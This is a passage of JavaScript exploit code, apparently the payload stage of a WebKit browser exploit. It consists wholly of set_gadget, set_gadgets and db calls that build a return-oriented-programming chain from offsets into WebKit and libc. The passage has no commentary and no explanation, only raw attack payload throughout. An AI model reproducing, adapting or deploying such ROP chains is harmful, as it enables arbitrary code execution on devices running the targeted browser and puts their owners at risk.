webkit_base+2997875, 
libc_base+793877, 
ropchain+371632, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965100, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+371728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+371784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([12, 0]); 
set_gadget(libc_base+788575,); 
db([12, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+371936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+371992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+372112, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+372144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+372128, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+372240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+372224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398464, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+372368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+372336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([238, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([238, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+372544, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+372512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+372496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+372600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+372704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+372736, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+372720, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+372832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+372816, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+372928, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+373008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+373064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([9, 0]); 
set_gadget(libc_base+788575,); 
db([9, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+373216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+373272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+373344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+373400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+398056, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+373560, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965084, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+373688, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+373744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+373792, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965084, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+373896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+373912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+374064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+374080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+374048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374184, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374280, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+374264, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+374360, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([20, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+374496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+374696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+374680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+374832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+374976, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+374968, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+374992, 
ropchain+375008, 
libc_base+811575, 
ropchain+375024, 
libc_base+811575, 
ropchain+378256, 
libc_base+759626, 
libc_base+793877, 
ropchain+375080, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+375160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+375216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+375296, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965084, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+375400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+375416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+375568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+375600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+375584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+375552, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+375720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+375736, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+375704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+375824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+375880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+376000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+376032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+376016, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+376192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+376160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+376144, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+376248, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+376352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+376384, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376368, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+376544, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+376496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+376600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+376704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+376736, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376720, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+376896, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+376848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+376952, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+377056, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+377088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+377248, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+377200, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+377352, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377336, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398080, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+377504, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+377576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965084, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+377680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+377696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+377848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+377880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+377864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+377832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+377976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377960, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+378064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+378120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965084, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+378200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+373752, 
libc_base+788575, 
ropchain+398088, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+378368, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([20, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+378504, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([46, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+378688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+378792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+378808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+378960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+378992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+378976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+378944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+379088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+379072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+379192, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391120, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398096, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+379368, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+379496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+379480, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+399648, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+379624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+379608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+379640, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(webkit_base+11924577,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+379784, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+379760, 
webkit_base+7438103, 
webkit_base+2810902, 
libc_base+793877, 
ropchain+379776, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+759626, 
libc_base+792472, 
ropchain+399656, 
libc_base+793877 
]);
db([4294965072, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472, 
ropchain+399728, 
libc_base+793877 
]);
db([4294965064, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+50775, 
libc_base+793877, 
ropchain+380008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+379976, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+380120, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+380104, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4096, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+380432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+380624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+380768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+380880, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965064, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+380984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+381144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+381112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381128, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+381224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965072, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+381328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+381464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+381480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+381448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
